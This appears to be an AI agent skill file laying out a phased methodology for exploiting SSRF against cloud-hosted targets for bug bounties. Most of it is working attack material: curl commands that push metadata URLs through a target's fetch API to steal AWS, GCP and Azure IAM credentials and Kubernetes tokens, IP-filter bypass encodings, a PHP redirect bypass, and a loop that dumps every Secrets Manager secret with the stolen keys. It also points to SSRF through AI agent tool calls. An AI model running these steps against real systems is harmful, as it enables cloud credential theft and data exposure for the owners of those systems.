---
name: hunt-ssrf-cloud
description: Hunt SSRF vulnerabilities specifically targeting cloud infrastructure — AWS EC2/ECS/Lambda instance metadata (IMDSv1 vs IMDSv2), GCP metadata server, Azure IMDS, DigitalOcean/Linode droplet metadata, EKS/GKE pod service account token exfil, environment variable leakage via metadata, and lateral movement via harvested IAM credentials. Use when the target is hosted on AWS, GCP, Azure, or any cloud provider and accepts user-supplied URLs. Critical when chained to IAM credential theft. Pairs with hunt-ssrf for general bypass techniques. Keywords: SSRF, cloud metadata, AWS, GCP, Azure, IMDS, EC2, IAM, 169.254.169.254, instance metadata, service account.
sources: hackerone_public, github_security_lab
report_count: 44
---

# HUNT-SSRF-CLOUD — Cloud Metadata Exfil & IAM Credential Theft

## Crown Jewel Targets

| Cloud | Metadata endpoint | What you get |
|---|---|---|
| AWS EC2 | `169.254.169.254/latest/meta-data/iam/security-credentials/` | Temporary IAM key + secret + session token |
| AWS ECS | `169.254.170.2/v2/credentials/<UUID>` | Task role credentials |
| AWS Lambda | Environment vars via SSRF to `localhost` | `AWS_ACCESS_KEY_ID`, etc. |
| GCP | `metadata.google.internal/computeMetadata/v1/` | OAuth token, project ID, SA key |
| Azure | `169.254.169.254/metadata/instance` | Managed identity token |
| Kubernetes | `kubernetes.default.svc/api/v1/` | Pod SA token → cluster access |

Any SSRF on a cloud-hosted target is potentially Critical. The metadata server is always at the same IP.

---

## Attack Surface Signals

**URL/parameter patterns to target:**
```
?url=
?src=
?link=
?fetch=
?image=
?avatar=
?webhook=
?callback=
?proxy=
?redirect=
?download=
?import=
```

**API request patterns:**
```json
{"url": "https://example.com/image.jpg"}
{"feedUrl": "https://rss.example.com/feed"}
{"webhookUrl": "https://myserver.com/hook"}
{"importFrom": "https://docs.google.com/..."}
```

**Features that commonly cause SSRF:**
- Image upload via URL
- PDF/screenshot generation (Puppeteer, wkhtmltopdf, Browsershot)
- Webhook registration
- RSS/Atom feed import
- Document embedding (embed YouTube, Notion)
- URL preview / link unfurling
- JIRA/Confluence macro URL parameters
- S3 pre-signed URL generation that fetches a URL first

---

## Step-by-Step Hunting Methodology

### Phase 1 — Confirm SSRF exists

1. Set up an out-of-band callback server (Burp Collaborator, interactsh, canarytokens)
2. Inject your OOB URL into every URL parameter:
```bash
# interactsh one-liner
interactsh-client &
OAST_URL="https://abc123.oast.fun"

# Test every URL parameter
curl -X POST https://target.com/api/import \
  -d "{\"url\": \"$OAST_URL\"}"
```

3. Confirm: DNS callback received → SSRF exists, now pivot to cloud metadata

### Phase 2 — Cloud provider detection

Before targeting metadata, confirm cloud provider:

```bash
# Detect cloud from response headers or SSL cert
curl -I https://target.com | grep -iE 'x-amz|x-goog|server: cloudflare|azure'

# Check IP owner
dig +short target.com | head -1 | xargs -I{} curl -s "https://ipinfo.io/{}/json" | jq '.org'

# Check for cloud-specific subdomains
subfinder -d target.com | grep -iE 'aws|ec2|gcp|azure|digitalocean|linode'
```

### Phase 3 — AWS IMDSv1 (unauthenticated, single request)

```bash
# Step 1: List available IAM roles
ssrf_fetch "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 2: Get credentials for the role
ssrf_fetch "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# Other useful metadata paths
ssrf_fetch "http://169.254.169.254/latest/meta-data/hostname"
ssrf_fetch "http://169.254.169.254/latest/meta-data/public-hostname"
ssrf_fetch "http://169.254.169.254/latest/user-data"  # startup scripts, often contain secrets
ssrf_fetch "http://169.254.169.254/latest/dynamic/instance-identity/document"
```

**Helper alias:**
```bash
ssrf_fetch() {
  curl -s -X POST https://target.com/api/fetch \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"$1\"}"
}
```

### Phase 4 — AWS IMDSv2 (requires a PUT preflight)

IMDSv2 requires a `PUT` request first to get a session token. SSRF via `curl`/HTTP clients usually can't make PUT requests to metadata. But:

1. Try the IMDSv1 path anyway — many instances have IMDSv1 still enabled
2. If IMDSv2 only, check if the SSRF allows custom headers:
```json
{"url": "http://169.254.169.254/latest/meta-data/", "headers": {"X-aws-ec2-metadata-token": "..."}}
```
3. Check if the app's URL-fetching code automatically follows the two-step IMDSv2 flow

**Two-step IMDSv2 SSRF** (if the app allows custom HTTP methods):
```
Step 1 PUT: http://169.254.169.254/latest/api/token
            X-aws-ec2-metadata-token-ttl-seconds: 21600
            → returns TOKEN

Step 2 GET: http://169.254.169.254/latest/meta-data/iam/security-credentials/
            X-aws-ec2-metadata-token: TOKEN
```

### Phase 5 — AWS ECS task credentials

ECS containers use a different endpoint:
```bash
# ECS metadata credential URL is in environment variable
ssrf_fetch "http://localhost/env"  # or via /proc/self/environ

# If AWS_CONTAINER_CREDENTIALS_RELATIVE_URI is set, use:
ssrf_fetch "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

### Phase 6 — GCP metadata server

```bash
# GCP requires a specific header: Metadata-Flavor: Google
ssrf_fetch_gcp() {
  # Target must forward headers; test if it does
  curl -s -X POST https://target.com/api/fetch \
    -d "{\"url\": \"$1\", \"headers\": {\"Metadata-Flavor\": \"Google\"}}"
}

ssrf_fetch_gcp "http://metadata.google.internal/computeMetadata/v1/"
ssrf_fetch_gcp "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
ssrf_fetch_gcp "http://metadata.google.internal/computeMetadata/v1/project/project-id"
ssrf_fetch_gcp "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"  # startup scripts
```

**Alternative GCP endpoints (no header required on some old instances):**
```
http://169.254.169.254/computeMetadata/v1/
http://metadata/computeMetadata/v1/
```

### Phase 7 — Azure IMDS

```bash
ssrf_fetch "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Requires header: Metadata: true

ssrf_fetch "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Phase 8 — Kubernetes service account token

If the target is running on K8s:
```bash
ssrf_fetch "http://kubernetes.default.svc/api/v1/"
ssrf_fetch "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
ssrf_fetch "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
```

With the SA token, test against the K8s API.

### Phase 9 — IP bypass techniques

If `169.254.169.254` is blocked, try:
```
http://[::ffff:169.254.169.254]/
http://169.254.169.254.nip.io/
http://0xA9FEA9FE/       (hex)
http://2852039166/        (decimal)
http://169.254.169.254#  (fragment)
http://127.1/             (short localhost)
http://0177.0.0.01/      (octal)
```

Redirect-based bypass (if SSRF follows redirects):
```bash
# Host a redirect on your server
echo '<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>' > r.php
# Then: ssrf_fetch "https://your-server.com/r.php"
```

### Phase 10 — Post-exploitation with stolen IAM credentials

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ROLE_NAME
aws s3 ls
aws ec2 describe-instances --region us-east-1
aws secretsmanager list-secrets
aws ssm describe-parameters

# Check for secrets manager access (jackpot)
aws secretsmanager list-secrets | jq '.[].Name' | while read name; do
  aws secretsmanager get-secret-value --secret-id "$name" 2>/dev/null
done
```

**IMPORTANT:** Only enumerate permissions. Do not modify resources. Document and report.

---

## Automation

```bash
# SSRFire — automated SSRF scanner with cloud payloads
python3 ssrfire.py -u "https://target.com/api/fetch?url=FUZZ"

# Nuclei SSRF templates
nuclei -u https://target.com -t ssrf/ -t cloud-metadata/

# interactsh for OOB detection
interactsh-client -v

# ffuf with cloud metadata wordlist
ffuf -u "https://target.com/api/fetch?url=FUZZ" \
  -w cloud_metadata_paths.txt \
  -fc 400,404 -v
```

---

## Chain Table

| Finding | Chain to | Impact |
|---|---|---|
| IMDSv1 SSRF | IAM credential exfil | Critical |
| IAM credentials | s3:GetObject on all buckets | Critical |
| IAM credentials | secretsmanager → API keys, DB passwords | Critical |
| GCP metadata token | Cloud resource access | Critical |
| K8s SA token | Cluster-level API access | Critical |
| user-data script | Hardcoded secrets in startup script | Critical |
| SSRF to internal HTTP | Internal API access, pivot | High |

---

## Validation

✅ **Confirmed SSRF to metadata:** Response contains `"Code" : "Success"` with `AccessKeyId` field

✅ **Confirmed IAM key validity:** `aws sts get-caller-identity` returns an ARN

✅ **Confirmed GCP token:** Response contains `"access_token"` and `"token_type": "Bearer"`

✅ **Confirmed K8s token:** `/api/v1/namespaces` returns namespace list

### Severity assessment

All cloud metadata SSRF leading to credential theft is **Critical (CVSS 9.8+)**. Payout range: $10k–$100k+. Do not underreport.

### Related skills

Cross-reference: `hunt-ssrf` (for general bypass techniques), `hunt-llm-injection` (for SSRF via AI agent tool calls), `hunt-oauth-oidc` (if IAM keys include OAuth/OIDC secrets).
